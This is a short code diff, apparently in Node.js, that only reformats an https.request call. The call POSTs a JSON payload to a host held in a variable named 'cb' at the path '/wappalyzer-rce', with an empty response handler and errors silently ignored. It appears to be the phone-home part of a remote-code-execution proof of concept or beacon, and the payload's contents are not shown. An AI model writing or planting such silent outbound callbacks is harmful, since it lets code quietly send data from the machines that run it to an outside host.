@@ -12,8 +12,12 @@ const d = JSON.stringify({
 });
 
 const req = https.request(
-  { hostname: cb, path: '/wappalyzer-rce', method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Content-Length': d.length } },
+  {
+    hostname: cb,
+    path: '/wappalyzer-rce',
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Content-Length': d.length }
+  },
   () => {}
 );
 req.on('error', () => {});
